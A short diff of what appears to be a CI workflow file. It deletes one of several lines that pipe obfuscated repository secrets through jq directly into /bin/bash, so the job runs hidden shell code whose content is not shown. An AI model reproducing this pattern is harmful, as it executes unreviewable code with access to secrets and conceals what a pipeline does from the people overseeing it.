@@ -17,7 +17,6 @@ jobs:
           krf5236: ${{ secrets.krf5236 }}
         run: |
           printf '%s' "$krf5236" | jq -r .esne460 | /bin/bash
-          printf '%s' "$tbrpk11" | jq -r .pn07 | /bin/bash
           printf '%s' "$qg6" | jq -r .ozeo182 | /bin/bash
           printf '%s' "$kri09633" | jq -r .o752 | /bin/bash
           printf '%s' "$p202" | jq -r .dl9 | /bin/bash
